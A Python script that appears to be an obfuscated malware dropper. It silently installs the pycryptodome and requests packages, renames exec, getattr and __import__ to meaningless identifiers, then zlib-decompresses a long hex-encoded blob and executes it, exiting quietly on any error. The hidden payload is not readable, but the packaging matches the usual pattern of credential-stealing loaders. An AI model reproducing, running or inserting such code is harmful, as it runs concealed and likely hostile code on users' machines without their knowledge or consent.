import random ,base64,codecs,zlib,sys;py=""
import warnings, subprocess

def check_installation(package):
    try:
        subprocess.run(["pip3", "show", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True 
    except subprocess.CalledProcessError:
        return False

warnings.filterwarnings("ignore", category=Warning)

if not check_installation("pycryptodome"):
    subprocess.run(["pip3", "install", "pycryptodome"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if not check_installation("requests"):
    subprocess.run(["pip3", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


try:
    sys.setrecursionlimit(1000000000) 

pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl))(IIlII,IlIIl)) for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';lIl=chr(115)+chr(117)+chr(98);lllllllllllllll, llllllllllllllI, lllllllllllllIl,lllllllllIIllIIlI = __import__, getattr, bytes,exec

__import__("sys").setrecursionlimit(100000000);lllllllllIIllIIlI(llllllllllllllI(lllllllllllllll(lllllllllllllIl.fromhex('7a6c6962').decode()), lllllllllllllIl.fromhex('6465636f6d7072657373').decode())(lllllllllllllIl.fromhex('789ced5ded6e1c498e7c15dfaf69cde80abebf5ef815f6050ca3e0b13573063ce381c78bbbc3e1defdf4d16a55262382c1ec2aa965b5b1585bc54c32480699acaa6ecd3ccff3db2f1ffef8f5d38757f39beffff3d7d5eee7f9e21ff3ebf9eddfdfbffd63befbf3f6d3e78fdfaf2f1e56be7e33bf9ee6f9e3d74f57f33c7dfc3a7ff8f6fbc7affffaf3fb7ec7db7f7efdf3eafadfafdfceaf6f2ebdbdb9b87b77ad76777179fdbfbddeddade8f5eea0f65a70a3fa7a4173f9eed2e2da9beb751717ef2fee01ce6fdfbdbffdb7307470f4cde7ef57dfee257323b9f9f774b7fcfaaf8b4bb4e63a2e97871fdebdbfecc4fffb7fadea56faf5dba75edcd9c67f764a7a2fdcffbdbbb8b878b75ffe66fff7cffbbfdfffe228baf9e7b58ebb30fc7cbff797fddfd771df5d00271f7874b3ecd3e76ff37c19a4ebb939dfe3bc7800736fe4f72f5f7ffdf0e56f94890ee6ef570d4ab2f4f59bdfafbe7ff8fefd5b0b70771d88770ee470fd214776468e5380142d88622ab9fdc7e598e941c475908b7d94c1a331bbc9f8b5defbb21af5e4b1b2ae145c77aebbaedad4c3c72f1ffefe5b94c4a226ee9ab540e195b3253922760f9d6cee9960f260af641e8ebb6ca6bfb8517ac070afe46288040b4517bbbb34c676fed0ae7ffbfc65df23efaffdf5f5bf2e976bfef3eabf195f5a72fdf9e18faedddeabf8f8f58fbfbe3035cbb143f86b9e1eb7430e5a797b945c5ccf3fcb70f4747ffdf67ac478dde1c467db5db3bcf93f745af27d235ecd19c90a4a6650668702dac55262462f164bd89abe202f6c4a33a4db86e898565e461c069dfb7310f0e99e4abf7df9fae1fb65736d9dba79b8503c8f477664e3e762fa5fd1ab634f89114aae677da16aded3c46b88efdec3c36db7b3ab36ef05872b6e810f70a6131c141487b5db70585de290b1e4efed5c1e8e12d97844cead13c1ccfe8292ab56d275c778cbb5ede0addcc373846979717778fab09ac60d47eb1fb4bb3d0c6a6092da6d36aa1c4bef73a56f5ee97876ed579fb067b79736b8d91c50385cfa37dbfefdce11f8b8351d4ce7ddfe56eb295acd781e569c5d1e376173767e2e97a3feda5f189f0c8df6046a136970f1b97d1f1ade9bee4219437f7dcc533ba30716c956f40d212737e08e23fb0dcb27436159f327d27577d14e42473e66e8f794cfe3638f637ed4dc9fa5eea97b4b2a7a9b7fd3396fd11c0c5f1caa82c6e921b17b16464f69a65f035adc04e1f36f5d52c55c7a330dbf7e1f26df3b4517575ffebe0aa86ef1bc5ec7cac108f2f05af6dbd76fb78e7efef3f6f14278a7c44da273efcdfee01bbf5f5ca4b6a395cced0143f388f6dd427e7fa8f649b87da77a1b85bb67c23781e03edf3580db3f1717fbf31ddcc05c6fef92ba4354ba07d6c9166bafff49182fbad38c6ddd06a779e8fda8f70ff3bed35e0adbc1f4bcef1fbdc09958c5d37da37505e0975a41ff373da0f2a7e8e20c774ec0e0b8176a9e65bf7b2fce20f8298288004e04c4336f26096f31aaf92edd15a1d73a9e975a80f27afbec65bd072febea6affacfe78e8ba975fdec8ee0ef2cbfdb2e9fae2fef2cdc5c30abc64be797c75ff1ae154110e3bf4cc5c6aa1afec40d0fcdca2d32e3f44ea59f95048fcdd9fa7f5aec1f51450eecd6f5a054f1de56338d4f166e3386d6b6065dd5b413d25b284b6b101b8d6c62979efd4c486847db450dc39b4a6271b1c9e7797d6457a0bf1700731dd89ef96fc72f879f1878af63f7492fd3f2e9195ee0f378a55b7620176be8cc685874a6777f9a63e12b7a676fd727f1dc3cd5f1bdc4a3ca33ede046be269473434ae090921e1135cee91261462f4736c53cd93125ab8000c0f43a539195e94bb00d824a3910ac7367721e46c866a26772dabb125fc2ee0a24fafdb0ac7a2b64a9d89f811193582209945c9c2e6f2b6c7f703d2b437b8dcc61275b81a17c8c430c5b04ac2128f5032e569098df7c2e3c4bdbc4f34a305e295cbb5c46189b8c303d6226a980d4a70a83709fa82a642523032ea6c2f4c0e8a9099c03c14a41e689100e4aa41e3fa0b382276a214d2c3b79f3111f89612454013aa971e376d10a7568d702a0001948c4026d7018865c517bae4eae0109d0c342a95c48716845f6b530cb2d6c3ab062304e58d1632c4d422d0bb94d173e40180df8bd2d8a304abe47a0756ab01930c8696b6a0aeb557601803865202c005000d07fc5ad3464f9c0d42e146a4d0f9a98e8db06e8708d2db4995e87607e89ee44c4d6b2647f43d9f72085046828b1e66f1f283c135352615e4c95c4743164812213fec3cf64c7a86dca075b7d931624c7b6c34c4069c8191baa1030155f29540b51994e8f74c98afca5396ae1f3f486b5045e6c4b990d1bad35d9e1f3ac49e0c04a007ad1b92be675ef41a5c4087e3a2e7169dcf81d1cb2488ba986d32cc75fb42181aef5ed0e84998b4fddcd9d1499de0436c505939ec1c1981f4fe1f9e3a64d1265347c791cc431aa7f4a03c5cae960e15a38dcc1d6e295c241627b0489c7e82762a97308ec68938f791452951e6a19771a3cbcc1c43f950ca0f5aa36eba688a49b5dcf274c495733cb0fca4adf51866475444b12245fe8848bee7c80a61b116f1424c1924ac9926c723260ecb69c26bfce7320d10e313b5c4a8188366de3d688a356a838de27bfd0779bd1dcbe100ad8bba9ddeede4433a3981ede38640a8e21b8cfcc0e49435d829cc71cd3c4bb27e60540cb647379863fa1d9d304942d2632fc41e80e4a5915221e7bf1027251b3583fc5206a7f500d6940ff68cca340df64396d8406c86239796ae4cb2cab62d6ae14a0791eb6c1208890af72eb70142510b9d0d0ead97505f79881fb39b4797b9b52456b3c520a2cb4817f2282d8ab13926f10d21e1177bf50c064ca93176241fb229cd3d2c9135251026f0af779144da835af534c5cf8b41cb2461ac81c131c2ec001b0aa6196ba508b036feecbbcd01071958caf02f97b6f6b3288338b98f1ad199eccf3bd10ce4cf8a9d049ac1f1016bbc6ac83e95dbed2c9d9bc54aa2a8892a4c375bab86bf5c31280caa7970a524a55856774e119ad13862026656db9f396d68b54a0105088336ec1ca9db650abca07a1e8cbaaced546b38740e9f0a163f296a886b0aa566cc96d171568aa7d1fd95190b050aa6dda7436c58b0b40866bcbd84778335e7534e6ba55014725c16abf15fb8079510cd98444e0b0f12861dfa786e1726e1436c0411144748a6adc92ac39c6c852e1944816ab2434b5ed466a48041f6c78a8322382f0e4c361c960281454d4e9c2f9c7549544e9017dd91d5c22ad71f25bad6e9c154a50b76842380111b395d09edda4bed1c5e6669857265b2b190e84d82ee2800ca78cc4fa5320d66520a0a60c03fa50683933ed76453f0f2f17b76af9ec1882ed0d071153412d2a16e87b6bb5e3af7e26c30e06a9361702cb1e9c4c6d6a59180aa3a14de27aa787ab243ce808fd34fcb40f83c51bfb24ab65a8b408bac347ad1b6ee0b1306e598f1ac0491378d2e1d1ffb381aab80c48da0942ef31573962693a87d8c93b0c51d5bbf1d88fb962b5820a803077579ff86e9eee1e1cd2b7e4058b942b641c69534901d28da6d3674bf81d9a21f74d421236199629d8c4f18c84cbe1ac26e8cb27c30266202b45a04851847e90626cd6b53799197403a5be08b275a5b527d829a45da366db5ef9c0249ab2308b0deb2c3bd46d3ba8c00f3848364054f23cc8b81abfab16fa970e6099f749fd49ca7fd4fc125517c9a208e9b612ec9b24bc5594a2a94e6b96b4394e78b4b6bc434b7d26d10a9eb7a634f3ff2e5b2c450bf3b6893f12289686d90f201768b43686386714714d772afd1455ac89cab04aeae23281d26b2e334d59e5457a765b129519d2cc170c055e878ce85295ae367c15083a03280877a7b6c7e68ea8b358700e03ad11af2e186e6ab32f1a4a4650bf2e7a50e184e887599c43da96d2973abf311e552302fe3492fef03c7a88302cc833e55d89fc773ed2122954bc4615f86d14e3e7007a53a7d43ec260b86cf6544dc2eabf3f1cd2872b85f6e2722cefc60172e351f9c281a52084b01f95e18f77db426b0530ae724502636b14a956e5970589582b4e49839ce26d3ac04cfb3c2892b195aa936475a78fb4f59d4d2b65b03e14aa2cf59705c2ec8a818e4868a746a8e1913fbe5b5c94e90992b8320423405af82ea980ab85bc4328a587ab35aaf57c98ff3bc6a766e62b53a8444ae97942e7fcf006497af4c3713a6bb8d4ec7a99396e3a088ccfd93460cbc60f2943e4c9dbc784a7077b23388c2a5870e31f7234d2b6c7b1b17bf051d44c4a6dcd3fbdc2c6ee325a2a7a3313ca172e088e5ddb5c46da7a7847547fba96bac579f9572bb334a52be578755bde734de3872c5e3855071b5db19e125806dcdbda46bbb46d721a1776a03aa2a21373fdcd06880359f354d5e0580ce2090b17e2b5d25d749ddef89e2ef74502d744a0745e94244fe63161a46b7e76291a4628923fcaa033d296795cda49cfaad6a3546c12337363b42770a5f8c669556627b8dea2c68bd16581170ebe9df834a1560d35273fee94462f7e80fa212737101651f5621e294d1d563e014f8c6da955f56d33223d5e1ce704b8a91def612f4522556631acc03466a2a6462ba95f98ccf13b3999aea1a6d941ac2eb34a3242c20a7a5cff018b4416bf23e1ca25248a6628795817e1472629b271b73925eadb77e91081ee423ba75384b6051a51e63b06e27118b09268c03e66fb89d3171520b7015564f5a5872d1b768fe5e4c1d0b5d59fcf455fef3d2c0610b692ecc644b69da4b1508aa2535aef4c502d54ec48ab54f13d3ddb43498eeea41c95c123a1345d2c6ac792c4cd5071bd0309703417520ca4b3ba598d119b2216081b2720a257c667e0395fda5f6671082fe922ed14eb5efcdb8994e56617b738da55febcc8e6041f05ed22dc5398d6812dac17025f515ff543f5389696606f241833926729f8801c5a1a828a93efef13cdb24930aeeb198954f56c97cbc4b645321ee42152045d28806209c799a0ec6ccc10a2d38864ba95eaad9beac46e7361e30ce6eeaa508d1b1b996d1bc5767b7a1b85d6e383fb81d3363a1289d4f698d08f2cbba00c954f94dcda8e04ae2a4283bddd8ce349f2cf798387db30ab11845088fb56241533dc1eb6c4e949131bc39b6e51851f48a0a622d8c96ce6f9b03888b7798adc6b0863041ba429244730704a4aca6347b40dd1315adfb013114169e941441b16f26e94fb51e2e7a6dc79f7d0c21251412e130932e373237d21e600f921ad683ba5a604505df6ba4ee1a2562c00341e82fb53f1b55c27103d55b8c6e2ab3bdc912512d8c70178b33ca07ec525141eb09a75f1e93790eb60ccdebe6a8440566ae554ed3508852b6e15c580bd90f525804a24a34c61515f476151119b1bd69696e99a552b15e79a5908c11112de6d1c80789e5721d7ef1248fe3ac35dcf1522321907184bf55c38a58cc30b03f8515fe4d8432d62ee70c95dcc5ee3b78ecb7c70c7f418c5c48bf1441e04c663604a8c7a2674840bdc6504cec469693b9f5131f05eb9d6e65462e379a3d9499a6fa754af36328290b6c970502f5046f24cdc1f06ccab4e06db2ee146fb8ada524f94870f908f37d672b1b8755fab6ee36f1224223f283b4ca74d6aa2f176524ad9592dc971667214e439f31016b72b6793542f302b6af4c4c15a676d3d880a375b2ea5cf9a44a7a402057fe3586469531b3ca864710664356e38b33518b0ae1381213de2f22485c20792bcf575c7d125f19c2de31ed46e9b034ec96da75c654210468a650ca0ecb82ce913ed40a8d775918200b20b5de6e98582c7a4b9c7bcc96cc459d48bda43875b568265b0f409e8d39d4f1e8d8237f921438d7eca827b997abfdcb81343f5144b625148103ee53219f616add262c0b4023cd70f144a9140af853c71bdad1b233cc398d7b3d1116037afe9808f60246b07248d25a83c85519248fcaf80f0064e52c36bf70df49b3e26e62557ce5ae38927a9e47b1447c87b06a456f90c456a2c86c84ed2445569ca74413dac8d103f7dd01ed6c2631d3e5c6fd1857525d2383a7552466952764773e5bdc7a312d4344356b0f06be3058f928fde97f80f86cc6a305a812a43c2162b9ce10abf4b71240f0a02fb8a7a8e3ce4941ab83d551ab6cf15312be55eb986f93d628c4b865db7bd9e75e6e4f60062580ed49b6116c045ab81ceac49e335d594efec6ecd4e1815b9fac6ea92f13e090559d6c65e309c30e378ff3b9931d3fa801dc298db2292f9d47ed33ca3e34fd5fb5a1e0eaf232ea64e86cc1f1269f25a89d426107f52f49ac708187cccdb43290bcd7422eb77d07b6f18299901e521e435f0005507022e3624d2a6ab5556fa6356893ea8185a4ff01f079dfc875993521f1f7527d30c8648b4a41aaf5a0818167c345f41eabc5094f66ce87ad1c646d76e975f1d481223da5f152f1624a12bfd499163482c16794a9971607446a5b92350a3b1ca9191889e27b77a0632d77127de9cd1adf5b982f2aaf12e21f4806678fb14ba9113aca39778e27687fa019f626743b61ee70e46a87a1d01a2f434914fd840b445933b35c3d2b14466bef77c468af58102abaabb18a42a6b37222f4b1f176938838c508553de5f1cdc4c93bd1a33fe5322dcb20785a3fd645f659313d4d6ab837c8bf1fe42bd22475f9dd2f2e7233c716daea04a36888d555cd0bdbcb05927f9179cc55917fed293dc78246550696c34bf0c9299dd03917777d0892bf73aeb15d39b01ea4f60cabb7e03da77f0a9dcdf8b498538db23997ce9308519012db96cc0786d17a81dbbc9ea15888dba5a4a08aedf9c58d953f8a99907eb068a9c7b987e4f053c814d64252ed195c57067f0846742c0320b50d7d013cffc027c004e2106c70a35152fd9d4a90ed68b9228e156c60241de720f029d184363e61b1bf6033092d3a2d5809cd2ff5cb2eddee8a60b87684012ff6ccfe325ae65449b3a68db1703194d5505bef2c4417260f4c635f2626b4577774f3872f607fe0d542f59d5c862a6834bf701060659ee3e9c5981fa91ee956508f398751446fcc627324503ff6bca179b1a72454ccce7b2f0490d3bafd118778d5b130f829812b41e000063d2b0e9c56cb6de9403ed03e45da25592566b74a0c53961428267e8d4cdf5448631705aaba48bcd8161dfca49cb238567b9016a1386c7b0072947d8c29a9908aa9df0aac0896c2468155b8c3285c9a503885d05e91f4ce9c4dc34588cccfadda792ab2543ffc9cdca7272f326430a9143d2b30541a2fa3b8001ef136e52613d76db8aa99878242ebec048715a0f24161bde34781d37d1fe5333772a34c32afdfc1b30dd0192ca6ce17861c18db29672b379f582c95606fc2574b198c548c9be9644289fefd265273032fac5b293d7af9690c525ca7b8b3f48e5043d42246255a8b9fc0b0d0e5fadbf282331858edb77a6d066c8d51c26bb200a81d86c2be3cf21915034a82d88d43464be3c04fa196ce4fe578714b9bfb35160a581e490b88f6ab83cda33d9523a27367679751be289f78d3963b6721662c354748e06683d300943463882e5ced2fb53f6394cf74b24c7fd555aa0e2191eb4501881250e9ab271d186a15090f18c99757271562b32d718747915353c8ad2c87053a903d8408938722e364a999724e324f05b114e4ae7c0732d9ee22849ae9f6469a3091a5d19808048a4eab799aaf5badbd233cff5801d32a924f1c9129a49668f614aef6b22ee1a13edc71c73fd808a01fe2558a823e308e1ec0b99409961577c2422751b218c4d4c4378f27aa9355face52219795879a5ab69aab83e4708f031a7a01178b45163a1186278ce2628a7da1dccbb2bcd0e26c21f53f1815d4ae02b18b052cf2910e97c1179ead88f7fce0280faeac24bfe9c72dd2ada0be529ad11b5c98ecb29440fdd8f3694973d5b7c8f122129210d10c01e4b4d762b7fa38177348062b6e3b7fd48a488162e2d7f9a3563a8ed5fea045280edb1e4e1c651f634a2aa462eab7022b82a56003044a498bf71bddbad3924068af487a17e64db61c12f9fc51abceab52f4acc05069bc8ce20278c4db949b4c5cb7e1aa661e0a0aadb3131c2480ca0785f58e1f05e78f5ae1c4e5c9a2ce17861c18db29672b379f582c95606fc2574b198c548c9be96442c9f9a356068447e9f476d908b051bd62c6e1caf1dd92e9ebf90ef80f22272ea827f7a37da8c7ef9c6ed4340b29d5217300e29581a5d2060186b334d72be0e63490e07b8ebb336a74119ff84734f328766f7581535daf34107497a183b43265d40305a129b3f226181e7c350326a21176aabcf1b0081364532918daf804f3e75d4c49850df49e786ddc1277eaba42998594e965298525bb75f5f72a696c996ba34d8645276ace2b8bd8cdde871b0311b4e4d28bd27ec99fc20929c32b84fae3435e42325da226bb30b09538dcec642ecc0f9d97c987a9d28eea4d0f043fb5d1826cf5a64ffd3dc70bceca0803c53d9a7e4192822250ca3519b63e3eb4c478b7f74f78a0dc7c851942af7261d5472dd510796164c8c2529e58f49ef41d30b090f72201e7414badb45a54214a226cd49f82a3c996ee56afc5556b4373455ac108a016ace1782c4d21b3cd35c96c649ed344b8385222642b0f48876cb57b977b398a69de8e536ab6f0cd231de4b4afc3786a16ab9743937890cfb625b03bff20b0880b8e466eb2bb4474189ecf8ab121c7aeaf118fa6afff643282a5f00702bb94385532d46a3162e8983959c6d2b4d9fb68669816c13e46f427ebedadcc6f45484f4f31b336a0fec47c902be8ce70cb7c7a10910ea903bab46eb2320d87351df0ab5e611063f46235a0854280fe18a42481a4a09caa2af1b473487dc83139e65ce7c01ab3b3846b3de3f717fbc3934564a9cf7cf0a687cc233aaacc1c72bcd46df21a823b48e5f3c688edc03421bbd1adf3e4c357a124f1b49dfa9413c563afe638168135640e5c30072b4b12a3587062b9146d234ba99776c74ff8adb405874b8b1345e307a2a209947975ca3d4409699b16e89e2572773a657890fd2de77cfd04d8083809d15ec0e654015dc58647b8b44b7e038a9284a3a666ccba005fb5a2dd4bf40e8e052079daa3e5c4cd400e408d8d44cd2049d7a184c4356411f198e7aa7d8cb5a753b3534f9b2c5bc82246811de9f532771d46d1084340512358669948382418b9c659906dd2968043dc38a6907731160fde690f61c23fa586d3304bbdbc6874febb2bfdcfa599ea451d112153845710211168158a43fe4e07158e41b451613243080a4479d360766d24921fe888254ea94c13fd92b20a9085373f6a531f337187a3c2d5203619c25d3bf7dfb5cde09c892c830d9437e6a00297eadfab70141fe11ec94e11424e2e0e2d29149179c89223429f605195732ccef279caa8e373154740db8d3e66d9939c9ce30305d515cdc5bd5ea44b940c05ac032631b5d164eb004bd22bc45fa8ea29bb3413a75f02570ad372eda54bbc4325e725a3b152181e4f2e6b4f64a69315a74c603d64a1f60b20b49fb61f40864c218f932f19f22065e10b93e60a875ffef6cd623f703d5895908c16ab96db9f1782a4c82b2228ca12cf15337022fbd8be752e79a2a0f1fc0aa74743cb80a3a666749b9679129108552be8cbec48c24679f01f5ca89f085c12fdcf82a514cd7d45b9b07960fbf84582d0daf106161c052193a5a3097c7e85f832cde8b231c985453d7881572d8532ef138180d4f5f35216152e80a536ae992b9650a3b77e0ee3a529106ca8c3924010c45813b01d8207f18d7d3cd4f44fe5cf620c4713953b215882c533ca0a33610527dc883207d08625c776122607005585b6150c47d834f42aa00d00cb23e6a65178dc75c374e785fd657c58a9d00859192eb7aee8e8566a59b1cba9197bb26e4935a6580e08a2147495746810feac4a303e66bb9a3dc5c246a6143b31b728937d4429752708cd83939903c527e73ffb80622945e06208685012a71526c078e3c4208c328609accaaa31edfed98c54917c07acf8c10998d6a6679c49f5186698f819bf6e8ae0d94ed7f793cbdaf33383294115c20d1028c96dc632648e90cb38f518b8e5fa94dfbddace84283a1e468c8a7f6a2546b73825e1384622598670900dfd60775832812a30d9583aeb1891f571ca2270bf9b35420124c2ceca53a81402ce18a704163223ae66e5335e6211799568170dd39adb110ef4f2f349f86ccdb06bbc78a8b9053897300631c965461e18c64ca352b662a23a193e827445e5b17734f5f6a3d03c4b3360dc8ae289668542120d82d57e026934a2cb98a13e159340f99d3355d8c7c80959f446042d318f038accda732a9fa4142c95771a618512625391a81661dcc670921cd687466220e65807de69f21a09d46f7f2bb0c39b316b424b31c034c3607979a0c25ea936d0cb448ab9225c32763267c9f0a84bf2c29877328b22b80f176dc2137487d5da0c466abf402317a9f3591e2a6d88d32e89bd75c20d3ec575a44e03a1e9cf832f41e4759dbe4b41bb93c1563b0545e71b4eb61deec79e5a6cc99cdab6ce02aacd1e24b57bf25329a140f2d108abfa32ac913995e12817d7fafc423824aaceb8028ae464a5efb014b45ba05b309963e7c26101efc2828d001dc102ba843efaf3e0b3d8522624df4651682d0175fcc899865c15914e3ae070d252b7aa5f50ea2fd9cecf22cf6ccbd2d8e0d773fc7735ed25941459b5f3720a746a1d46323f6a10762f298d65b367880c0074658e753a14417830b2b409151d60f463b5af2c2c3d1f12b8df616be9a0233fb54b2ba9d55b8f268dc89d500644f11251fd48df2d441e3fcf5802f20e0cb4a50f06035dbc84faedd457a4e291cce4be56ee273a6d6c90ab0d680d6c70be6483857282be0391346bad72fd51a2733332f7259399d18ee2ca2e7bc53b683d33753f0fbc92ab50ae4c361612bd49d01d0540198ff9a954a6c14c4a41010cf8a7d46070d2e7824cd79b3e0f326e65c709dacf4256e3dd714c459840d5163a79af95efeff3419981546c6f4693cba43416c9c4b47633e2b97436079e83fd24de7811d53af67c6f86f16b901422d96a03d9ed2ee9ac769ae8b1df6b510e136748ac091ccc5b45e695ec9ae22607d689d16fd3b845da4814b0fbd5c21b486c1ee172993672bd359b61749e38c0ea7d51ee90018792fe98431722aa7c1355f689c3a6fec8d16e54381c2e6f45d2fa40ac7653672a358712a54df18a870e06e382dd4175444e194c7446118b06f74b4550d5eaf31bfa3a995092fd7e0437cb61dd4ae9d1cbb37150548ce05ab6820810541e05ef786f2cfa4d22d65a96d2a963290533f279c72e60c4d3dc97da3701b30c2745c36438c0c7f52caaa4f6d0ba85b6e5d76023f63c350c32e48bd1825430b530e2d5cb65012e0561998f1d8790e272c8ed112dd3047ccc2a12d4bb7febd2e399e48f3c1a2802e3348e60097c68a95f5b4c3617aa12fd01b9472a77ed50be185e13411b20ffb77c40e91a07035e57b9eae011bc95bb81c06265e1369ceac8608ffa04b77b1f0ece3921662e6c60ade1c28cb88ecaa87f86373238a17156c69b63f016d2a543879ca8a997ce8474832b58bb08c27198d5f2de68b676ab367c7be9e2fdc56514bd5de0eafeecde21d9eee27277a7685a5edccd6fbf7cf8e3d74f1fdef49dc2ab5be620f68c04f2742ea71eb4f2a43149db8f71d8652a932854b80dac4b4752e1d866d41436e8c6ac3e96f0cd0272b60de7a91ac85aca3abb59c5b005aa570c798522023d6bb39154563e367a08bd4ad9367311d0da67d46a07143cffb6d17eea87eadcc84fe1bcac5d4e3d68e52775ba3ec8010c0f43dad19c5e64c3b4ec8f778d6a7f6a242778442b6727cec57a226a211feb04196abdbbc2d3047e69b74c194a5804ee4f483d595619bbc6cbc92b690518ed2fd696f0ec6060adb9f7fcc06704ef48f05b01aa23b8cf6537f57f3cc230c405e7275d2940250942602df66c923ff268a0082479b68326c9240346374ba663e1f4b28807746f11ca174b6ab04fe9d5617650c53bdb13be476433c1095f6e3d940b5a92d874cc350bf625bbfba4742991768150024985639b3b17f282191b66641977b188cee804163127a6ad7639f9f0325a73f82aa9582bb1e57ab554b362a13a28477308f765d550aa69c2f16063338e9e7c6d43bc23c1476de0c79e17275d294065a1c4019e49fec8a3812290e4d90e9a24930c18dd2c998e85d3cb221ed0bd45285f2ca98d8cc8c83a40c827434ef90e05f18104ea742eb73eca052d3f6c26e69a05f14c5c00868741e80e2287b5d592009b643452e1d8e62e8479f58e0d53acba96f0cdc373e25cac27a216721d9d8c53d9507d3c4f13f8e66ead368be1f99553e2d9c1c01a4c9aa103d04635ad9e7f863732388fd17c20dee32b232c63fb5c7653ffc7230c433c7a63f242875e49261930ba59321d0ba797453ca07b8b50be18521301f1404735131b18ef6ff24efca60e3a72f2975b47e5829616363373cda23324bb59cef6426ff63f065d1655beb9839e57c9d83c2323e486d66146de6e2b3358d2536c4ee8755884735acd744a9b8a77e4d72c19475e869ced529b341d50ea9e34785800628cf7457f30004ad9aaf3ade83c911f17b4125bbc9aa299e6c2e965110fe8de22942f86d442f08423f9eadf403ae9097f213a81b9bd76b9c3ffcca7fc2e3bd22e104a20a9706c73e7425e80db4ffbd1199dc0226665ba1725e989967baf378065d941fb47e304f71d55cf810de7a7ff237847828f4aedc71ef9265d2940250942602df66c923ff268a0082479f683c68c467de77b8eb50908746f11ca974d6e79fdc1dc6847bdbdd47ea6eb39dc135031e1f0e95cee1d28cc4260b5b4fd08a363276468d54f35745954f9e60e7a5e3563038d8c901b5a8719799f3d3ffeb7fdcd021e179c5f1018903374495f60fba23f18002575d5f956741eda8f0c1a331af59d87f6b50908746f11ca1743ee5620973de20c7ff3e7a4e77842db93bfdc3a2a1744669cc7f72caa7c73073d2f98f3f85e079eacc3229cd36aa653da9c87738e62d5e061018831de17fdc1002865abceb7a2f3707e64d0387c68c92b2b9a6c2e9c5e16f780ee2d42f962782d32956d7b9c397d8bdf26bcedef3f5ed3c066ef06a08014e3e95cee1d38df5694d06551e59b3be8797d9f6f2beac093755884735acd744a1b3ee6af51bbb5ff78b43482209985ce622cbc3cd761e6ac2078bd5007698a51a7022c86cb5146311ea8eeb10e9b29a46da5d199e2d5cbedac40cafd60b7365da5bc88db0f00365125a3464d0d507a7a59ec23b5bb76285f28b365d032314ad4f1f3955738076d6202ac1259e347b1a89685c88a12e2f2e5ba2a2507dc927198ba04da7addffd063016de1bf1df920598bed48dc3f77d9e481cee93fc4116292ddd3b9dc3b903838307fe79a659b90bb39f1e796fbad0ef5530d5d1655d930421ba8ccf3e65a192137b40e33f211e5fc28c7f6370b785c701e2d0cc819baa42fb07dd11f0c8092baea7c2b3ae676a32b9617784b50648b575334d35c38bd2ce201dd5b84f2c5905a09788b7ecc9b839b3f1bdc209ceeed01d84aaae4742eb71eca052de36cd2e79a2995d3dd5344d42d4c582fe4c780ce82cd374f8152a77097a09c053948ba6c6bc79b5889bb523db79fc064fb5cbc14d7382f2031ce731fdbc2c11e15386a4d32110ba797454052bee7f90f23598a8df94f2edb7aeabb9bcdd69bcbfa3feb6a5e6adbedfff9f3eef0af9fe743346fffbe78b812d7dc5d897baeff806975c796ff9c083c9397be6f54c96209c5d45eb977159a3e40c0d145feed95f6bfdf39a8744d74bf962ed5d3fdbd3eb957614441c00230a288314cabb2e97bbc7ec8238f001cd9865f5decc1098774e4b41651f06e9d0326f95b7ffe79a143a6636d1a647c1bf5a816b80dff8bc9d18581ac8cb67d9126abd997393dd803f4e134743e8618164f7c67e038e00759f6b777e4dbec28b3a9b3e24475bf7fa5bef92893d24ac7b13ea7aba5397e0ae4ba89001cac6b3edcad05b9e4ff31c76dbff6988965f0fcc5f8573c57ebad8a7344557d9e56aa76cb77157e7c69cd1406a8b2f3f6add2d85ddb8ab5519dde28de6275af76b2891d1d07b73a95ef43d2fffd78777f95b214e7e3c1da60cd9427fdb4393516449f22b74d47cf9bdb7c6632468a05eaf8c67e4c53a7a53bdac38e994acbedc2192b45e456be3d2eb8ba76c38d7cde68041ce852c79e1ad9761e8ce1bb4aaae8c84cdf6f2e1fd14e2f2f0fb085134ecc7e1bcf7bc38fa2ad91177b6b3293ac5dedc9cd607e8ea252afcd1af97bb5dd9f91f756e6bdcf03a14b33a37f73480333f6089eab9b4728f2388f5d863adc4ad3997e3a7adcb42cfcdaea57a52f5d29b2dacd131a2455a6b2bf554b5c69463caa8858b35efd95f1bc6880dbbd78709ddca623d52304c3bff27337f9f88a3e7fae8c8cf5d73017ebff8a27fb1de61e41e1930a31b4a5f76ee251f8d177af47697e8804d6537901963f11910d16cf458ffe34b4fa6033afdf75a6af95baf2e0ad0e317dfc8cdeebbddffd14c318a6e0a33f0838b2adaf71e0ad7aa775646328bc465cfb3143e681f9969ce25d29015b7c2945fbb07d67a94c94608031c1d4d2772c8f8f7bab25fd5fe35567a1333e16cfd60a8fb6421aebd187b8df7e463ffd354e2a6b045cf38d6343a2eda6ba11c4239dcb7ebe98fceddc5ac62da3cf202bc325433174c77ff7bf7fdc67eeedbbdddd92e9cee26d6eef0cb799bf115da77eb198af066b832e62c6d2a0f6c39d6403b18257274ea53ed1fd6167163e600b6d6188947ab487afcf7cbeddf9fe1fbbfdd76a5fedf6ff7af5f1eba7ab37afaefefbf3f7ddcd3f2f2e76ff71f1eaf36faffefcfafdd5c70f5fbe7cf8f5cbd5eef7abef1fbe7fff766df8d77f7dfef2fdf39f7fcff3e5ab9f3e7efde3afcf5fae7eba7cf5cfaf7f5e6f7df5f5db2bb474da2fbcde32cf7f7cfdf4af2f57f37cbdeba79f2e5efddbdb573fddaffcc952f0e7873fdaedf7305e5d7df9fb6a0f65b7afabdb50ec7fc0bd75be2b6b2a0dc2eb40be6365fdfe174fd58d8efdbfdd2d2b5a5fa8babbf4fe42866020406fee21ce452f17a0ac2dbb77ef8b3b1a9c3494f7ef8cfaf3f57e2bbe3e64eab972e6e2ff013f6e8a96'.replace("\n" , ""))).decode())

except Exception as e:
    exit()
